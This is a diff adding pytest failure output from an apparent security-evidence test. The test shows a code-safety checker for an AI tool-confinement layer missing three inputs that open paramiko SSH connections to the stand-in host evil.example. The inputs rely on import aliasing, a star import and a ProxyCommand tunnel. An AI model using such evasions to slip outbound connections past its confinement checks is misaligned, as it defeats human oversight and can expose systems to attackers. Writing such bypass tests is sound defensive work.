@@ -1,0 +1,28 @@
+FFF                                                                      [100%]
+=================================== FAILURES ===================================
+_ test_inline_aliases[from paramiko import SSHClient as Client; Client().connect(hostname='evil.example')] _
+/evidence/round3_aliases.py:11: in test_inline_aliases
+    assert _check_code_safety(code,session_id='aliases') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("from paramiko import SSHClient as Client; Client().connect(hostname='evil.example')", session_id='aliases')
+_ test_inline_aliases[from paramiko import *; c=SSHClient(); c.connect(hostname='evil.example')] _
+/evidence/round3_aliases.py:11: in test_inline_aliases
+    assert _check_code_safety(code,session_id='aliases') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("from paramiko import *; c=SSHClient(); c.connect(hostname='evil.example')", session_id='aliases')
+_ test_inline_aliases[import paramiko as p; p.SSHClient().connect('approved.example', sock=p.ProxyCommand('ssh -F none evil.example -W approved.example:22'))] _
+/evidence/round3_aliases.py:11: in test_inline_aliases
+    assert _check_code_safety(code,session_id='aliases') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko as p; p.SSHClient().connect('approved.example', sock=p.ProxyCommand('ssh -F none evil.example -W approved.example:22'))", session_id='aliases')
+=============================== warnings summary ===============================
+studio/backend/core/inference/tool_confinement.py:262
+  /work/studio/backend/core/inference/tool_confinement.py:262: DeprecationWarning: Due to '_pack_', the '_PathBeneathAttr' Structure will use memory layout compatible with MSVC (Windows). If this is intended, set _layout_ to 'ms'. The implicit default is deprecated and slated to become an error in Python 3.19.
+    class _PathBeneathAttr(ctypes.Structure):
+
+-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
+=========================== short test summary info ============================
+FAILED ../evidence/round3_aliases.py::test_inline_aliases[from paramiko import SSHClient as Client; Client().connect(hostname='evil.example')]
+FAILED ../evidence/round3_aliases.py::test_inline_aliases[from paramiko import *; c=SSHClient(); c.connect(hostname='evil.example')]
+FAILED ../evidence/round3_aliases.py::test_inline_aliases[import paramiko as p; p.SSHClient().connect('approved.example', sock=p.ProxyCommand('ssh -F none evil.example -W approved.example:22'))]
+3 failed, 1 warning in 0.11s
